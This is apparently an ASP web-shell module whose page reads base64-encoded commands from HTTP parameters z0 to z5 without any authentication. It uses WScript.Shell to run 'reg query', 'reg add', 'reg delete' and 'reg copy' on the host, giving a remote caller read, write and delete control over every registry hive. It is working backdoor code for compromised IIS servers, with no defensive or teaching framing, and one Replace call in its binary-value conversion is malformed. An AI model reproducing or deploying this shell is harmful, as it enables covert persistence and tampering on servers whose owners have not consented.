<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64Decode(byVal base64String)
    If base64String = "" Then
        Base64Decode = ""
        Exit Function
    End If
    
    On Error Resume Next
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    node.text = base64String
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    
    Base64Decode = stream.ReadText
    If Err.Number <> 0 Then Base64Decode = ""
    On Error GoTo 0
End Function

Function Base64Encode(byVal text)
    Dim xml, node, stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    stream.Open
    stream.WriteText text
    stream.Position = 0
    stream.Type = 1
    
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = stream.Read( -1 )
    
    Base64Encode = Replace(node.text, vbLf, "")
End Function

Function RunReg(cmd)
    On Error Resume Next
    Dim shell, execObj
    Set shell = Server.CreateObject("WScript.Shell")
    Set execObj = shell.Exec(cmd & " 2>&1")
    
    If Err.Number <> 0 Then
        RunReg = "ERROR: Failed to execute shell command. " & Err.Description
        Exit Function
    End If
    
    RunReg = execObj.StdOut.ReadAll()
    On Error GoTo 0
End Function

Function ValidateRegistryPath(path)
    Dim regEx
    Set regEx = New RegExp
    regEx.Pattern = "^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\[A-Za-z0-9_\\-]+$"
    regEx.IgnoreCase = True
    ValidateRegistryPath = regEx.Test(path)
End Function

Function ValidateValueName(name)
    If name = "" Then 
        ValidateValueName = True
        Exit Function
    End If
    Dim regEx
    Set regEx = New RegExp
    regEx.Pattern = "^[A-Za-z0-9 _\\-]+$"
    ValidateValueName = regEx.Test(name)
End Function

Function EscapeShellArg(arg)
    EscapeShellArg = """" & Replace(arg, """", """""") & """"
End Function

Function RegistryValueToBytes(value, dataType)
    Dim regEx, hexStr, cleanVal
    Select Case UCase(dataType)
        Case "REG_DWORD", "REG_QWORD"
            Set regEx = New RegExp
            regEx.Pattern = "^0x"
            regEx.IgnoreCase = True
            cleanVal = regEx.Replace(value, "")
            RegistryValueToBytes = Base64Encode(cleanVal)
        Case "REG_BINARY"
            cleanVal = Replace(Replace(Replace(value, " ", ""), vbCr, ""), vbAnsi)
            RegistryValueToBytes = Base64Encode(cleanVal)
        Case Else
            RegistryValueToBytes = Base64Encode(value)
    End Select
End Function

Function EscapeJSON(str)
    Dim SEC
    SEC = str
    SEC = Replace(SEC, "\", "\\")
    SEC = Replace(SEC, """", "\""")
    SEC = Replace(SEC, vbCr, "\r")
    SEC = Replace(SEC, vbLf, "\n")
    SEC = Replace(SEC, vbTab, "\t")
    EscapeJSON = SEC
End Function

Function ScanHives(hivesArray)
    Dim i, hive, output, success, jsonParts
    Redim jsonParts(UBound(hivesArray))
    
    For i = 0 To UBound(hivesArray)
        hive = hivesArray(i)
        output = RunReg("reg query " & EscapeShellArg(hive))
        
        If InStr(output, "ERROR:") > 0 Then
            success = "false"
        Else
            success = "true"
        End If
        jsonParts(i) = """" & EscapeJSON(hive) & """: " & success
    Next
    
    ScanHives = "{" & Join(jsonParts, ",") & "}"
End Function


Function ScanRegistry(basePath)
    Dim output, lines, line, i, match, subkeysJson, valuesJson
    Dim regExKey, regExVal, matches, subkeysCount, valuesCount
    
    output = RunReg("reg query " & EscapeShellArg(basePath))
    
    If InStr(output, "ERROR:") > 0 Then
        ScanRegistry = "{""success"": false, ""error"": """ & EscapeJSON(Trim(output)) & """, ""subkeys"": [], ""values"": []}"
        Exit Function
    End If
    
    lines = Split(output, vbCrLf)
    subkeysJson = ""
    valuesJson = ""
    subkeysCount = 0
    valuesCount = 0
    
    Set regExKey = New RegExp
    regExKey.Pattern = "^HKEY_"
    regExKey.IgnoreCase = True
    
    Set regExVal = New RegExp
    regExVal.Pattern = "^\s*(.*?)\s+(REG_\w+)\s+(.*)$"
    
    Dim firstKeySeen : firstKeySeen = False
    
    For i = 0 To UBound(lines)
        line = Trim(lines(i))
        If line <> "" Then
            If regExKey.Test(line) Then
                If Not firstKeySeen Then
                    firstKeySeen = True
                Else
                    If subkeysCount > 0 Then subkeysJson = subkeysJson & ","
                    subkeysJson = subkeysJson & """" & EscapeJSON(line) & """"
                    subkeysCount = subkeysCount + 1
                End If
            ElseIf regExVal.Test(line) Then
                Set matches = regExVal.Execute(line)
                Dim valName, valType, valData, dataBytesB64
                valName = Trim(matches(0).SubMatches(0))
                valType = Trim(matches(0).SubMatches(1))
                valData = Trim(matches(0).SubMatches(2))
                
                dataBytesB64 = RegistryValueToBytes(valData, valType)
                
                If valuesCount > 0 Then valuesJson = valuesJson & ","
                valuesJson = valuesJson & "{" & _
                             """name"":""" & EscapeJSON(valName) & """," & _
                             """type"":""" & EscapeJSON(valType) & """," & _
                             """data"":""" & dataBytesB64 & """" & _
                             "}"
                valuesCount = valuesCount + 1
            End If
        End If
    Next
    
    ScanRegistry = "{""success"": true, ""error"": null, ""subkeys"": [" & subkeysJson & "], ""values"": [" & valuesJson & "]}"
End Function

Function SetRegistryValue(path, name, dataType, data)
    Dim allowedTypes, t, isValidType
    allowedTypes = Array("REG_SZ", "REG_EXPAND_SZ", "REG_DWORD", "REG_QWORD", "REG_BINARY", "REG_MULTI_SZ")
    isValidType = False
    For Each t In allowedTypes
        If UCase(dataType) = t Then isValidType = True
    Next
    
    If Not isValidType Then
        SetRegistryValue = "{""success"": false, ""error"": ""Invalid type""}"
        Exit Function
    End If
    
    If Not (ValidateRegistryPath(path) And ValidateValueName(name)) Then
        SetRegistryValue = "{""success"": false, ""error"": ""Invalid path or name""}"
        Exit Function
    End If
    
    Dim formattedData : formattedData = data
    If dataType = "REG_BINARY" Then
        formattedData = Replace(formattedData, " ", "")
    ElseIf dataType = "REG_MULTI_SZ" Then
        formattedData = Replace(formattedData, ",", "\0")
    End If
    
    Dim cmd, output, ok
    cmd = "reg add " & EscapeShellArg(path) & " /v " & EscapeShellArg(name) & " /t " & dataType & " /d " & EscapeShellArg(formattedData) & " /f"
    output = RunReg(cmd)
    
    ok = "true"
    If InStr(output, "ERROR") > 0 Then ok = "false"
    
    SetRegistryValue = "{""success"": " & ok & ", ""output"": """ & EscapeJSON(Trim(output)) & """}"
End Function


Function DeleteRegistryValue(path, name)
    If Not (ValidateRegistryPath(path) And ValidateValueName(name)) Then
        DeleteRegistryValue = "{""success"": false, ""error"": ""Invalid input""}"
        Exit Function
    End If
    
    Dim cmd, output
    cmd = "reg delete " & EscapeShellArg(path) & " /v " & EscapeShellArg(name) & " /f"
    output = RunReg(cmd)
    
    DeleteRegistryValue = "{""success"": true, ""output"": """ & EscapeJSON(Trim(output)) & """}"
End Function

Response.ContentType = "application/json"

Dim action, hives
action = Base64Decode(Request("z0"))
encoding = Base64Decode(Request("z1"))

hives = Array("HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG")

Select Case action
    Case "hive"
        Response.Write ScanHives(hives)
    Case "scan"
        Dim basePath
        basePath = Base64Decode(Request.Form("z2"))
        Response.Write ScanRegistry(basePath)
        
    Case "set"
        Dim sPath, sName, sType, sData
        sPath = Base64Decode(Request.Form("z2"))
        sName = Base64Decode(Request.Form("z3"))
        sType = Base64Decode(Request.Form("z4"))
        sData = Base64Decode(Request.Form("z5"))
        Response.Write SetRegistryValue(sPath, sName, sType, sData)
    Case "del"
        Dim dPath, dName
        dPath = Base64Decode(Request.Form("z2"))
        dName = Base64Decode(Request.Form("z3"))
        Response.Write DeleteRegistryValue(dPath, dName)
    Case "rename_value"
        Dim rPath, rOld, rNew, scanResult, lookFor, foundData, foundType
        rPath = Base64Decode(Request.Form("z2"))
        rOld  = Base64Decode(Request.Form("z3"))
        rNew  = Base64Decode(Request.Form("z4"))
        Response.Write "{""success"": false, ""error"": ""Rename operations require local key logic cascade.""}"
    Case "rename_key"
        Dim oldKPath, newKPath, kCmd, kOutput, kOk
        oldKPath = Base64Decode(Request.Form("z2"))
        newKPath = Base64Decode(Request.Form("z3"))
        If Not ValidateRegistryPath(oldKPath) Then
            Response.Write "{""success"": false, ""error"": ""Invalid source path""}"
        Else
            kCmd = "reg copy " & EscapeShellArg(oldKPath) & " " & EscapeShellArg(newKPath) & " /s /f"
            kOutput = RunReg(kCmd)
            kOk = "true"
            If InStr(kOutput, "ERROR") > 0 Then kOk = "false"
            If kOk = "true" Then
                Call RunReg("reg delete " & EscapeShellArg(oldKPath) & " /f")
                Response.Write "{""success"": true, ""output"": ""Key copied and cleared cleanly.""}"
            Else
                Response.Write "{""success"": false, ""output"": """ & EscapeJSON(Trim(kOutput)) & """}"
            End If
        End If

    Case Else
        Response.Write "{""success"": false, ""error"": ""Unknown action"", ""subkeys"": [], ""values"": []}"
End Select

%>